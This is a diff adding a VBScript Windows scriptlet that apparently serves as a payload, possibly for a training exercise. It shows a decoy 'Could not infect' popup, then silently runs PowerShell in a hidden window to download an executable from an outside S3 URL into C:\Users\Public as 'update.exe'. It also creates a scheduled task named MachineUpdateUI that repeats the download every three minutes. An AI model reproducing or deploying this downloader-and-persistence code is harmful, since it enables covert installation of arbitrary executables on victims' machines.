@@ -1,0 +1,22 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration progid="payload" classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+<script language="VBScript">
+
+<![CDATA[
+    ' Fake
+    Set r = CreateObject("WScript.Shell")
+    r.popup("Could not infect... exiting!")
+
+    ' Download
+    cmd="powershell.exe -w Hidden Invoke-WebRequest -Uri https://s3.amazonaws.com/exercise-pcap-download-link/GoTeam.exe -OutFile C:\Users\Public\update.exe"
+    CreateObject("WScript.Shell").Run cmd, 0
+
+    ' Persist
+    stay="schtasks /create /F /sc minute /mo 3 /tn MachineUpdateUI /tr " & Chr(34) & cmd & Chr(34)
+    CreateObject("WScript.Shell").Run stay, 0
+]]>
+
+</script>
+</registration>
+</scriptlet>
